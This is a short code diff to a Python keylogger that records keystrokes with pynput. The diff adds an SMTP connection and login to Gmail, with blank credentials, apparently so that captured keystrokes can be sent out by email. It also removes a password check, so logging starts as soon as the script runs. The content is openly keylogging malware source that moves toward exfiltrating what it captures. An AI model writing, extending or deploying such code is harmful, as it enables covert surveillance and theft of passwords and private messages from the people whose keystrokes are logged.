@@ -4,6 +4,16 @@ from threading import Thread
 from sys import exit
 from datetime import datetime
 from pynput.keyboard import Listener
+import smtplib
+from email.mime.text import MIMEText
+
+#Setting up connection
+sender = ""
+password = ""
+
+server = smtplib.SMTP("smtp.gmail.com",587)
+server.starttls()
+server.login(sender,password)
 
 def timer_thread():
     counter = 0
@@ -31,10 +41,9 @@ def save():
         queue = ''
 
 def main():
-    if str(input("type password: ")) == "admin":
-        print("\* keylogger is running */")
-        timer.start()
-        with Listener(on_press=write_to_queue) as l: l.join()
+    print("\* keylogger is running */")
+    timer.start()
+    with Listener(on_press=write_to_queue) as l: l.join()
 
 if __name__ == "__main__":
     queue = ''
